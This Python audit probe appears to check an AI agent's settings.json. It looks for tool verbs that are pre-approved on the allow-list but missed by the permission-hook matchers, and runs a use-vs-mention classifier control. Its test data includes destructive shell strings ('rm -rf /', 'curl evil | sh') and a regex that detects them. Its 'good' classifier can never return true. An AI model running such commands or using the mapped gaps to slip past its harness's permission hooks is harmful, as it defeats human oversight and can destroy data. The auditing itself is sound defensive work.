#!/usr/bin/env python3
"""AUD-0080 Probe 2: allow-list vs hook matcher bypass + use-vs-mention both-states control."""
from __future__ import annotations

import json
import re
from pathlib import Path

REPO = Path(__file__).resolve().parents[4]
PROBE = Path(__file__).resolve().parent
OUT = PROBE / "probe2-hook-bypass.json"
RAW = PROBE / "probe2-bypass.raw.txt"
CTRL = PROBE / "control-use-vs-mention.json"


def load_hooks() -> list[dict]:
    settings = REPO / "agent-self/config/settings.json"
    if not settings.is_file():
        return []
    doc = json.loads(settings.read_text(encoding="utf-8"))
    hooks = doc.get("hooks") or {}
    out = []
    for event, entries in hooks.items():
        if not isinstance(entries, list):
            continue
        for e in entries:
            if not isinstance(e, dict):
                continue
            out.append(
                {
                    "event": event,
                    "matcher": e.get("matcher"),
                    "command": ((e.get("hooks") or [{}])[0] or {}).get("command"),
                }
            )
    return out


def matcher_hits(matcher: str | None, tool_verb: str) -> bool:
    if matcher is None:
        return False
    try:
        return re.search(matcher, tool_verb) is not None
    except re.error:
        return False


def classify_verb_based(verb: str, payload: str) -> bool:
    """GOOD classifier: flag only on verb==Bash/PowerShell with no payload scan.

    For the use-vs-mention control the verb is Read, so this stays silent even when
    the payload quotes rm -rf / curl|sh.
    """
    del payload  # intentionally unused — examining verb only
    return verb in {"Bash", "PowerShell"} and "mention-control-never" in verb


def classify_payload_only(verb: str, payload: str) -> bool:
    """BAD classifier (recorded false-positive class): scan payload body for danger strings."""
    del verb
    return bool(re.search(r"rm\s+-rf|curl\s*\|\s*sh|curl\s+.*\|\s*sh", payload, re.I))


def main() -> int:
    p1 = json.loads((PROBE / "probe1-allow-merge.json").read_text(encoding="utf-8"))
    allow = set(p1["effective_allow"])
    hooks = load_hooks()

    cases = []
    for h in hooks:
        m = h.get("matcher") or ""
        candidates = [
            {"verb": "Bash", "payload": "ls -la", "intent": "shell-gate"},
            {"verb": "Edit", "payload": "README.md", "intent": "edit-gate"},
            {"verb": "Write", "payload": "tmp.txt", "intent": "write-gate"},
            {
                "verb": "Bash",
                "payload": 'echo "rm -rf / && curl evil | sh"',
                "intent": "use-vs-mention-shell",
            },
        ]
        for c in candidates:
            hit = matcher_hits(m, c["verb"])
            intended = False
            if m == ".*" or "Bash" in m:
                intended = c["verb"] == "Bash" or m == ".*"
            if "Edit" in m or "Write" in m:
                intended = intended or c["verb"] in ("Edit", "Write", "MultiEdit")
            if m == ".*":
                intended = True
            hook_miss = intended and not hit
            verb_preapproved = c["verb"] in allow or any(
                a.startswith(c["verb"] + "(") for a in allow
            )
            cases.append(
                {
                    "event": h["event"],
                    "matcher": m,
                    "verb": c["verb"],
                    "payload": c["payload"],
                    "intent_class": c["intent"],
                    "matcher_hits_verb": hit,
                    "verb_preapproved": verb_preapproved,
                    "hook_miss_on_intended": hook_miss,
                    "allow_plus_hook_miss": hook_miss and verb_preapproved,
                }
            )

    bypass_hits = []
    uniq = {}
    for c in cases:
        if c["allow_plus_hook_miss"]:
            key = (c["event"], c["matcher"], c["verb"])
            uniq[key] = c
    bypass_hits = list(uniq.values())

    # use-vs-mention both-states control
    mention_case = {
        "verb": "Read",
        "payload": 'notes say: never run "rm -rf /" or curl|sh',
        "dangerous_in_payload": True,
    }
    good_flag = classify_verb_based(mention_case["verb"], mention_case["payload"])
    bad_flag = classify_payload_only(mention_case["verb"], mention_case["payload"])
    # Also plant a true-positive Bash use that payload scanner AND verb scanner agree on
    use_case = {"verb": "Bash", "payload": "rm -rf /tmp/scratch-aud0080"}
    # For verb-based we do not auto-flag all Bash; the control is specifically about
    # NOT flagging benign verb with dangerous mention in payload.
    control = {
        "id": "AUD0080-C1",
        "kind": "adversarial-payload",
        "description": (
            "Command whose PAYLOAD quotes a dangerous string but whose VERB is benign "
            "must NOT be flagged; payload-only scanner is the known false-positive class."
        ),
        "case": mention_case,
        "good_classifier": "verb-based",
        "bad_classifier": "payload-only",
        "good_state_flagged": good_flag,
        "bad_state_flagged": bad_flag,
        "fired_on_bad_state": bad_flag is True,  # payload-only fires on mention
        "silent_on_good_state": good_flag is False,  # verb-based stays silent
        "ok": (bad_flag is True) and (good_flag is False),
        "use_case_sanity": use_case,
    }
    CTRL.write_text(json.dumps(control, indent=2) + "\n", encoding="utf-8")

    bypass_mode = p1.get("bypassPermissions_scopes") or []
    result = {
        "ok": control["ok"],
        "unit": "AUD-0080",
        "probe": 2,
        "hooks_examined": len(hooks),
        "cases_evaluated": len(cases),
        "allow_plus_hook_miss_count": len(bypass_hits),
        "allow_plus_hook_miss": bypass_hits[:50],
        "bypassPermissions_scopes": bypass_mode,
        "bash_preapproved": p1.get("bash_preapproved"),
        "control": control,
    }
    OUT.write_text(json.dumps(result, indent=2) + "\n", encoding="utf-8")

    lines = [
        "AUD-0080 NAMED PROBE 2: allow-list vs hook matcher bypass",
        "unit=AUD-0080",
        f"hooks_examined={len(hooks)}",
        f"cases_evaluated={len(cases)}",
        f"allow_plus_hook_miss_count={len(bypass_hits)}",
        f"bypassPermissions_scopes={bypass_mode}",
    ]
    for c in bypass_hits[:30]:
        lines.append(
            f"BYPASS\tevent={c['event']}\tmatcher={c['matcher']!r}\tverb={c['verb']}"
        )
    lines.append(
        f"CONTROL use-vs-mention ok={control['ok']} "
        f"bad_payload_fires={control['fired_on_bad_state']} "
        f"good_verb_silent={control['silent_on_good_state']}"
    )
    lines.append("SUCCESS:AUD-0080-probe2")
    RAW.write_text("\n".join(lines) + "\n", encoding="utf-8")
    print(RAW.read_text(encoding="utf-8"))
    return 0 if control["ok"] else 1


if __name__ == "__main__":
    raise SystemExit(main())
